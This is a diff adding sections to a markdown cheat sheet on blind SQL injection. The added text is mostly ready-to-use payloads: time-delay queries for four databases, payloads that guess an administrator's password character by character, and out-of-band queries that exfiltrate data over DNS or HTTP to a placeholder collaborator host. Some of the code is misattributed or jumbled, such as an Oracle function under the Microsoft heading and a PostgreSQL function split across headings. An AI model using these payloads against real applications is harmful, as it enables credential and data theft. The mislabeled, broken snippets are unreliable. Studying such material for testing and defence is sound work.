@@ -14,6 +14,8 @@ Many techniques such as UNION attacks are not effective with blind SQL injection
     - [Length of the password](#length-of-the-password)
     - [Extract password](#extract-password)
 - [Extraction sensitive data via verbose SQL error messages](#extraction-sensitive-data-via-verbose-sql-error-messages)
+- [Exploiting blind SQL injection by triggering time delays](#exploiting-blind-sql-injection-by-triggering-time-delays)
+- [Exploiting blind SQL injection using out-of-band (OAST) techniques](#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)
 
 ## Exploiting blind SQL injection by triggering conditional responses
 
@@ -132,7 +134,107 @@ xyz' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE
 
 ## Extraction sensitive data via verbose SQL error messages
 
+Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:
 
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+
+This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
+
+You can use the CAST() function to turns an otherwise blind SQL injection vulnerability into a visible one.
+
+For example, imagine a query containing the following statement:
+
+```sql
+-- Microsof
+SELECT 'foo' WHERE 1 = (SELECT 'secret')
+-- > Conversion failed when converting the varchar value 'secret' to data type int. 
+
+-- OTHERS
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+ERROR: invalid input syntax for type integer: "Example data"
+
+This type of query may also be useful if a character limit prevents you from triggering conditional responses.
+
+## Exploiting blind SQL injection by triggering time delays
+
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
+
+:warning: Triggring time delay Queries depend of the version of SQL
+
+```sql
+-- Oracle 
+dbms_pipe.receive_message(('a'),10)
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
+-- Microsoft
+WAITFOR DELAY '0:0:10' 
+IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' 
+
+-- PostgreSQL
+SELECT pg_sleep(10)
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
+
+-- MySQL
+SELECT SLEEP(10)
+SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+```
+
+Example of guessing password on Microsoft with this approach:
+
+```sql
+-- Microsoft
+'|| IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+-- PostgreSQL
+' || (SELECT CASE WHEN (LENGTH(password) > 1) THEN pg_sleep(2) ELSE 'a' END FROM users WHERE username='administrator') --
+' || (SELECT CASE WHEN (SUBSTRING(password, 1,1) = 'a') THEN pg_sleep(2) ELSE 'a' END FROM users WHERE username='administrator') --
+```
+
+## Exploiting blind SQL injection using out-of-band (OAST) techniques
+
+An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
+
+### Burp Collaborator
+
+To cause the database to perform a lokup for the a domain:
+
+```sql
+-- Oracle (elvated privileg require)
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+--data exfiltration
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+-- Microsoft
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
+--data exfiltration
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+
+-- PostgreSQL
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+--data exfiltration
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f(); 
+
+-- MySQL (Windows only)
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+--data exfiltration
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 
 ---
 
